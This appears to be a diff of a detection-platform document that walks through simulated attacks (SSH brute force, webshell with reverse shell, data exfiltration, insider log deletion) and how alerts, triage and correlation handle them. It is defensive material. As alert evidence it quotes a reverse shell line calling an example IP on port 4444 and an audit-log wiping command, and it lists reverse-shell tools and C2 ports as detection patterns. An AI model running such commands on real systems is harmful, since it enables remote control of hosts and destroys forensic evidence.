@@ -1,6 +1,8 @@
 # Attack Simulation Scenarios
 
-Detailed walkthroughs demonstrating how SecurityScarletAI detects, analyzes, and responds to common attack patterns.
+Detailed walkthroughs demonstrating how SecurityScarletAI detects, analyzes, and ranks common attack patterns. Each scenario shows the full pipeline: detection → alert creation → AI explanation → ML triage → risk scoring → correlation → analyst response.
+
+> **Note (2026-06-03):** Prior versions of this document referenced a `src/response/soar.py` module for automated response playbooks. That module has been removed; automated blocking actions in the scenarios below are now performed by the analyst via the dashboard, or by a future endpoint-agent integration. The detection and analysis pipelines are unchanged.
 
 ---
 
@@ -8,7 +10,7 @@ Detailed walkthroughs demonstrating how SecurityScarletAI detects, analyzes, and
 
 ### Overview
 
-An attacker launches a brute force SSH attack against the bastion host, attempting thousands of login combinations. After many failures, they find valid credentials and gain access.
+An attacker launches a brute force SSH attack against a bastion host, attempting thousands of login combinations. After many failures, they find valid credentials and gain access.
 
 ### Step 1: Detection — Sigma Rule Fires
 
@@ -37,15 +39,14 @@ tags:
   "mitre_techniques": ["T1110"],
   "evidence": [
     {"source_ip": "203.0.113.50", "event_action": "failed", "user_name": "root"},
-    {"source_ip": "203.0.113.50", "event_action": "failed", "user_name": "admin"},
-    ...
+    {"source_ip": "203.0.113.50", "event_action": "failed", "user_name": "admin"}
   ]
 }
 ```
 
 ### Step 3: AI Explanation
 
-The AI alert explanation engine generates a human-readable summary:
+The alert explanation engine (`src/ai/alert_explanation.py`) generates a human-readable summary using the versioned prompt template `ALERT_EXPLANATION_PROMPT_VERSION = "v1.0.0"`:
 
 > **What happened**: 8 failed SSH login attempts were detected from source IP 203.0.113.50 targeting bastion-host-05 within a 5-minute window. Multiple usernames (root, admin, user) were targeted.
 >
@@ -53,21 +54,33 @@ The AI alert explanation engine generates a human-readable summary:
 >
 > **Next steps**: 1) Block source IP 203.0.113.50 at the firewall. 2) Check if any successful logins followed from this IP. 3) Review SSH key configurations on bastion-host-05. 4) Enable fail2ban with stricter thresholds.
 
+If Ollama is unreachable, a template-based fallback (one of 6 category/severity templates) is used instead. The fallback is recorded as `fallback_used=True` in the `LLMResult` returned to the caller.
+
 ### Step 4: ML Triage
 
-The triage model evaluates the alert with 11 features:
+The triage model (`src/ai/alert_triage.py`) evaluates the alert with 11 features (`AlertTriageModel.FEATURES`):
 
 | Feature | Value | Signal |
 |---------|-------|--------|
-| `severity_score` | 3.0 (high) | High severity |
-| `source_ip_entropy` | 0.0 (single IP) | Low diversity — targeted attack |
-| `has_threat_intel_match` | True | IP found in AbuseIPDB |
-| `is_off_hours` | True | Attack at 3 AM |
-| `event_count` | 8 | Multiple events |
+| `severity_score` | 0.75 (high) | High severity |
+| `hour_of_day` | 0.13 (3 AM) | Off-hours |
+| `rule_hit_count` | 14 (frequent rule) | Established pattern |
+| `host_alert_count` | 7 | Multiple alerts on this host |
+| `asset_risk_score` | 0.8 | Internet-facing host |
+| `mitre_count` | 1 | Single technique |
+| `time_since_last_hours` | 3.2 | Recent similar activity |
+| `has_threat_intel` | 1.0 | IP found in AbuseIPDB |
+| `command_entropy` | 0.0 | Known commands |
+| `session_duration_hours` | 0.08 | Short session (failed auth) |
+| `login_hour_deviation` | 0.87 | Far from user's normal login hour |
 
-**Prediction**: `True Positive` with 94% confidence — this alert should be prioritized for immediate investigation.
+**Model**: `RandomForestClassifier` (100 estimators, `class_weight="balanced"`) wrapped in `CalibratedClassifierCV` (isotonic, cv=3) for calibrated probability output. The calibration wrapper was added in V2 (Epic 3) — probabilities are now trustworthy as confidence scores, not just relative rankings.
+
+**Prediction**: `True Positive` with 94% confidence — prioritize for immediate investigation.
 
 ### Step 5: Risk Scoring
+
+The risk scoring engine (`src/ai/risk_scoring.py`) combines multiple signals into a single 0-100 risk score:
 
 ```
 Risk Score: 85/100
@@ -79,7 +92,7 @@ Risk Score: 85/100
 
 ### Step 6: Correlation Detection
 
-The **Brute Force → Successful Login** correlation rule detects that a successful SSH login from 203.0.113.50 followed the failed attempts. This creates a second, critical-severity alert:
+The **Brute Force → Successful Login** correlation rule (`brute_force_success`, severity=critical, confidence_base=80%) detects that a successful SSH login from 203.0.113.50 followed the failed attempts. This creates a second, critical-severity alert via `create_alert()`:
 
 ```json
 {
@@ -88,6 +101,8 @@ The **Brute Force → Successful Login** correlation rule detects that a success
   "description": "Successful SSH login from 203.0.113.50 after multiple failures"
 }
 ```
+
+The match is also persisted to the `correlation_matches` table with a fresh `correlation_id` (UUID) for audit trail.
 
 ### Step 7: What the Dashboard Shows
 
@@ -101,7 +116,7 @@ The **Brute Force → Successful Login** correlation rule detects that a success
 From the dashboard, the analyst can:
 
 1. **Create a case** — Group the brute force + successful login alerts
-2. **Block the IP** — Via SOAR integration (`src/response/soar.py`), automatically add a pf firewall rule blocking 203.0.113.50
+2. **Block the IP** — Manual firewall rule via `pf` (`echo 'block drop quick from 203.0.113.50 to any' | sudo pfctl -f -`). Future endpoint-agent integration will automate this.
 3. **Run a hunt** — Natural language query: "Show me all activity from 203.0.113.50 this week"
 4. **Assign the case** — To the on-call analyst with a severity of `critical`
 5. **Document lessons learned** — After resolution, add lessons learned to the case
@@ -116,49 +131,36 @@ An attacker exploits a web application vulnerability to upload a PHP webshell, t
 
 ### Step 1: Detection — Multiple Rules Fire
 
-**Rule 1**: `Webshell Creation` (severity: critical)
+**Rule 1**: `Webshell Creation` (severity: critical) — `rules/sigma/file/`
 
 Detects PHP file creation in web-served directories:
+
 ```yaml
 title: Webshell Creation
 level: critical
 detection:
-  selection_web_dir:
-    file_path|contains:
-      - /var/www/
-  selection_shell_content:
-    file_path|endswith: .php
-  condition: selection_web_dir and selection_shell_content
+    selection_web_dir:
+        file_path|contains:
+            - /var/www/
+    selection_shell_content:
+        file_path|endswith: .php
+    condition: selection_web_dir and selection_shell_content
 ```
 
-**Rule 2**: `Reverse Shell Pattern Detected` (severity: critical)
+**Rule 2**: `Reverse Shell Pattern Detected` (severity: critical) — `rules/sigma/process/`
 
-Detects common reverse shell patterns in command lines:
-```yaml
-title: Reverse Shell Pattern Detected
-level: critical
-detection:
-  selection_bash_tcp:
-    process_cmdline|contains: /dev/tcp
-  condition: selection_bash_tcp or ... (7 patterns)
-```
+Detects common reverse shell patterns in command lines (7 patterns including `/dev/tcp`, `socat`, `nc -e`, `mkfifo`, etc.).
 
-**Rule 3**: `Outbound Connection to Rare/C2 Port` (severity: high)
+**Rule 3**: `Outbound Connection to Rare/C2 Port` (severity: high) — `rules/sigma/network/`
 
-Detects outbound connections to port 4444 (known C2 port):
-```yaml
-title: Outbound Connection to Rare/C2 Port
-level: high
-detection:
-  destination_port: [4444, 31337, 6667, ...]
-```
+Detects outbound connections to port 4444, 31337, 6667, and other known C2 ports.
 
 ### Step 2: Alerts Created
 
 Three alerts fire in rapid succession:
 
 | Alert | Severity | Host | Key Evidence |
-|-------|----------|------|-------------|
+|-------|----------|------|--------------|
 | Webshell Creation | Critical | web-server-01 | `/var/www/html/shell.php` |
 | Reverse Shell Pattern | Critical | web-server-01 | `bash -i >& /dev/tcp/203.0.113.50/4444` |
 | Outbound Connection to C2 Port | High | web-server-01 | Port 4444 to 203.0.113.50 |
@@ -177,20 +179,16 @@ For the reverse shell alert:
 
 | Feature | Value | Signal |
 |---------|-------|--------|
-| `severity_score` | 4.0 (critical) | Maximum severity |
-| `has_threat_intel_match` | True | IP in C2 threat feed |
-| `process_name_entropy` | 0.0 | Known suspicious command |
-| `event_count` | 3 | Multiple correlated events |
+| `severity_score` | 1.0 (critical) | Maximum severity |
+| `has_threat_intel` | 1.0 | IP in C2 threat feed |
+| `command_entropy` | 0.0 | Known suspicious command |
+| `mitre_count` | 1 | T1059 |
 
 **Prediction**: `True Positive` with 97% confidence.
 
 ### Step 5: Correlation
 
-The **Dropped Payload → C2 Callback** correlation rule links the webshell creation with the outbound C2 connection:
-
-```
-Confidence: 85% (base 75% + bonus for threat intel match)
-```
+The **Dropped Payload → C2 Callback** correlation rule (`payload_callback`, severity=critical, confidence_base=75%) links the webshell creation with the outbound C2 connection. The match is persisted to `correlation_matches` with a `correlation_id` and surfaced as a critical alert.
 
 ### Step 6: What the Dashboard Shows
 
@@ -201,7 +199,7 @@ Confidence: 85% (base 75% + bonus for threat intel match)
 ### Step 7: Analyst Actions
 
 1. **Create a case**: "Reverse Shell on Web Server" — severity: critical
-2. **Isolate the host**: SOAR playbook blocks web-server-01 at the network level
+2. **Isolate the host**: Manual `pf` rule blocking web-server-01 at the network level (or future endpoint-agent integration)
 3. **Natural language query**: "Show me all processes launched from /var/www/ in the last 24 hours"
 4. **Hunt from alert**: Pivot on 203.0.113.50 — "Find all connections to this IP"
 5. **Document**: Record the compromise vector (webshell upload) and remediation steps
@@ -216,106 +214,138 @@ An insider or compromised account begins exfiltrating large volumes of data thro
 
 ### Step 1: Detection — Sigma Rules
 
-**Rule 1**: `Data Exfiltration Volume` (severity: high)
+**Rule 1**: `Data Exfiltration Volume` (severity: high) — `rules/sigma/network/`
 
-Detects large outbound data transfers:
-```yaml
-title: Data Exfiltration Volume
-level: high
-tags:
-  - attack.exfiltration
-  - attack.ta0010
-  - attack.t1048
-```
+Detects large outbound data transfers (above a configurable threshold per host over a rolling window).
 
-**Rule 2**: `API Key Usage from New IP` (severity: medium)
+**Rule 2**: `API Key Usage from New IP` (severity: medium) — `rules/sigma/cloud/`
 
-Detects API key authentication from a new source:
-```yaml
-title: API Key Usage from New IP
-level: medium
-```
+Detects API key authentication from a previously unseen source IP for a given user.
 
-**Rule 3**: `DNS Tunneling Indicators` (severity: medium)
+**Rule 3**: `DNS Tunneling Indicators` (severity: medium) — `rules/sigma/network/`
 
-Detects DNS queries with suspiciously long subdomains:
-```yaml
-title: DNS Tunneling Indicators
-level: medium
-```
+Detects DNS queries with suspiciously long subdomains, high entropy labels, or anomalous query volumes.
 
 ### Step 2: Alerts
 
 | Alert | Severity | Host | Evidence |
 |-------|----------|------|----------|
-| Data Exfiltration Volume | High | api-gateway-03 | 2.3GB to 198.51.100.23 |
-| API Key Usage from New IP | Medium | api-gateway-03 | Key used from 45.33.32.156 |
-| DNS Tunneling Indicators | Medium | api-gateway-03 | Long subdomain queries |
+| Data Exfiltration Volume | High | api-gateway-01 | 4.2 GB outbound in 1 hour |
+| API Key Usage from New IP | Medium | api-gateway-01 | New IP 198.51.100.42 used svc-data-pipeline key |
+| DNS Tunneling Indicators | Medium | api-gateway-01 | 847 queries to `aGVsbG8gd29ybGQ.example.com` in 30 min |
 
 ### Step 3: AI Explanation
 
-> **What happened**: Unusually large outbound data transfers (2.3GB) were detected from api-gateway-03 to external IP 198.51.100.23. Additionally, DNS tunneling indicators and API key usage from a new IP were detected on the same host.
+For the data exfiltration alert:
+
+> **What happened**: An unusual volume of outbound data (4.2 GB) was detected from api-gateway-01 to a single external IP over a 1-hour window. The source user `svc-data-pipeline` authenticated earlier from a new IP (198.51.100.42) not previously associated with this service account.
 >
-> **Why it matters**: The combination of bulk data transfer and DNS tunneling suggests multi-channel exfiltration (MITRE T1048). The attacker may be using both direct download and DNS tunneling to bypass rate limits.
+> **Why it matters**: This pattern is consistent with data exfiltration (MITRE T1048 / T1567). The combination of bulk transfer and authentication from a new IP suggests either compromised credentials or malicious insider activity.
 >
-> **Next steps**: 1) Block external IP 198.51.100.23. 2) Revoke the API key associated with the new IP. 3) Query DNS logs for the suspicious domain. 4) Review data access logs for the past 7 days. 5) Check if the API key has been used for other exfiltration attempts.
+> **Next steps**: 1) Revoke the `svc-data-pipeline` API key. 2) Block 198.51.100.42 at the network edge. 3) Audit the data accessed by this service account in the past 24 hours. 4) Review DNS logs for tunneling indicators pointing to the same actor.
 
-### Step 4: Natural Language Query
+### Step 4: ML Triage
 
-The analyst asks the system:
+| Feature | Value | Signal |
+|---------|-------|--------|
+| `severity_score` | 0.75 (high) | High severity |
+| `host_alert_count` | 3 | Multiple correlated alerts |
+| `has_threat_intel` | 0.0 | No TI match (yet) |
+| `command_entropy` | 0.0 | Standard commands |
+| `asset_risk_score` | 0.9 | High-value data host |
 
-**"Which user is sending the most data externally?"**
+**Prediction**: `True Positive` with 89% confidence.
 
-The NL→SQL engine converts this to a safe, parameterized query:
+### Step 5: Correlation
 
-```sql
-SELECT user_name, 
-       SUM(COALESCE((enrichment->>'bytes_sent')::bigint, 0)) AS total_bytes,
-       COUNT(*) AS connection_count
-FROM logs 
-WHERE event_category = 'network' 
-  AND destination_ip IS NOT NULL
-  AND time > NOW() - INTERVAL '24 hours'
-GROUP BY user_name 
-ORDER BY total_bytes DESC 
-LIMIT 100
-```
-
-Results show `svc_deploy` accounted for 95% of all outbound data.
-
-### Step 5: Hunting
-
-The analyst opens the **Hunting** tab and sees suggested queries:
-
-| Hunt | Category | Description |
-|------|----------|-------------|
-| Data Staging & Exfiltration | Exfiltration | Look for large file reads followed by network connections |
-| API Key Anomalies | Initial Access | Find API key usage from new or unusual IPs |
-| DNS Tunneling | C2 | Check for DNS queries with abnormally long subdomains |
-
-They also run **MITRE Gap Analysis** and see that Exfiltration (TA0010) is well-covered, but Collection (TA0009) has fewer rules — suggesting they should add rules for data staging.
-
-### Step 6: Correlation
-
-The **Large Read → Large Network Transfer** correlation rule fires:
+The **Large Read → Large Network Transfer** correlation rule (`data_exfiltration`, severity=high, confidence_base=65%) links the file-access pattern with the outbound transfer:
 
 ```
-Confidence: 72% (base 65% + 7% for threat intel match on destination IP)
+Confidence: 65% base, possibly elevated by post-rule threat-intel lookup
 ```
 
-Linking the process read events with the network transfer events.
+### Step 6: What the Dashboard Shows
 
-### Step 7: What the Dashboard Shows
+- **Alerts page**: Three correlated alerts forming an exfiltration chain
+- **Cases page**: Pre-existing case "Q2 Data Audit" auto-linked via host/asset
+- **Risk score chart**: api-gateway-01 risk score jumped from 30 → 88 in the last hour
+- **Hunt page**: Suggested hunt: "Find all activity from user svc-data-pipeline in the last 7 days"
 
-- **Alerts**: Three linked alerts on api-gateway-03 with correlation badge
-- **NL Query**: Interactive results showing top data exfiltrators by user and IP
-- **Risk Score**: api-gateway-03 scores 78/100 (elevated due to threat intel match)
-- **Cases**: Create a case linking all three alerts
+### Step 7: Analyst Actions
 
-### Step 8: Analyst Actions
+1. **Create a case**: "Suspected Data Exfiltration via svc-data-pipeline"
+2. **Containment**: Revoke the API key, block the source IP, isolate the gateway host if warranted
+3. **Forensics**: Pull the enrichment JSONB for affected events (`SELECT enrichment FROM logs WHERE ...`) to see GeoIP, threat intel, and any other enrichment signals
+4. **NL→SQL investigation**: "Show me all data downloaded by svc-data-pipeline in the last 30 days, ordered by row count"
+5. **Document**: Record the IOCs, attribution if available, and lessons learned
 
-1. **Revoke the API key**: Through the SOAR response module
-2. **Block exfiltration IPs**: Add 198.51.100.23 and 45.33.32.156 to the firewall blocklist
-3. **Hunt for collection patterns**: "Show me all large file reads by svc_deploy in the last week"
-4. **Remediate**: Disable the compromised service account, rotate credentials
-5. **Document lessons**: "Implemented API rate limiting and response size caps. API keys now require IP allowlisting. Added monitoring for bulk data access patterns."
+---
+
+## Scenario 4: Insider Privilege Escalation
+
+### Overview
+
+A privileged user abuses their access to escalate to root, then disables audit logging to cover their tracks.
+
+### Step 1: Detection
+
+**Rule 1**: `Privilege Escalation via Sudo` (medium) — `rules/sigma/authentication/`
+
+Detects `sudo` execution events.
+
+**Rule 2**: `Log File Deletion` (critical) — `rules/sigma/file/`
+
+Detects `rm`/`shred`/`srm` targeting `/var/log` files.
+
+### Step 2: Alerts
+
+| Alert | Severity | Host | Evidence |
+|-------|----------|------|----------|
+| Privilege Escalation via Sudo | Medium | dev-workstation-07 | user `jdoe` ran `sudo -i` then `su -` |
+| Log File Deletion | Critical | dev-workstation-07 | `rm -rf /var/log/audit/*` |
+
+### Step 3: AI Explanation
+
+> **What happened**: User `jdoe` escalated privileges via `sudo` then `su -`, and subsequently deleted files under `/var/log/audit/`. The combination is consistent with anti-forensics activity.
+>
+> **Why it matters**: This is a critical defense-evasion pattern (MITRE T1070). Deleting audit logs after a privilege escalation suggests the user is attempting to hide unauthorized activity.
+>
+> **Next steps**: 1) Disable `jdoe`'s account immediately. 2) Pull the audit log from the central SIEM (this one) — the local deletion does not affect us. 3) Review the user's prior 30 days of activity for additional anomalies. 4) Engage HR/Legal per incident response policy.
+
+### Step 4: ML Triage
+
+Triage predicts `True Positive` at 96% confidence — the rule combo `sudo` + `log deletion` is highly anomalous in the training distribution.
+
+### Step 5: Correlation
+
+The **Suspicious Activity → Log Deletion** correlation rule (`defense_evasion_cleanup`, severity=high, confidence_base=70%) chains the two events. The match persists to `correlation_matches` and is surfaced as a critical alert.
+
+### Step 6: What the Dashboard Shows
+
+- **Audit log**: Every API call by `jdoe` is in the DB-backed `audit_logs` table, intact
+- **Cases**: Pre-built IR template "Insider Threat — Privilege Abuse" available
+- **Risk score**: User `jdoe` jumps to 92/100
+
+### Step 7: Analyst Actions
+
+1. **Disable account**: `POST /auth/disable` (admin-only — when endpoint-agent integration lands, this will be automated via AD/LDAP)
+2. **Pull audit trail**: Query `audit_logs` for all actions by `jdoe` in the last 90 days
+3. **Case creation**: Use the "Insider Threat" template
+4. **Coordinate with HR/Legal**: Per organizational policy
+5. **Hunt from user**: Pivot on `jdoe` to find any other hosts they accessed
+
+---
+
+## Test Data Generation
+
+To exercise these scenarios in development, use:
+
+```bash
+# Generate realistic test alerts (no real IOCs)
+poetry run python scripts/generate_attack_data.py --scenario ssh_brute_force
+
+# Or seed the full demo dataset (45+ alerts, 7 correlation chains)
+poetry run python scripts/seed_realistic_data.py
+```
+
+The generated events go through the full pipeline — Sigma rules fire, correlation chains form, AI explanations render, triage scores compute — without touching external services.
